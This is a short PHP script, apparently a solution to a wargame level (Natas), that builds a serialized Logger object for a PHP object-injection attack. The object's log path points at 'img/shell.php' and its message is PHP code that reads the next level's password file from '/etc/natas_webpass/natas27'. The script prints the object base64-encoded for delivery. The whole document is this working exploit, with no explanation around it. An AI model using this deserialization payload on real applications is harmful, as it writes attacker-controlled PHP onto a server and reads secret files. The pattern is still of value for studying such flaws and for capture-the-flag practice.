<?php
class Logger {
    public $logFile;
    public $initMsg;
    public $exitMsg;
}

$logger = new Logger();
$logger->logFile = "img/shell.php"; // Hear is where we are writing the file
$logger->initMsg = "";
$logger->exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>"; // We read the password file

echo base64_encode(serialize($logger));

?>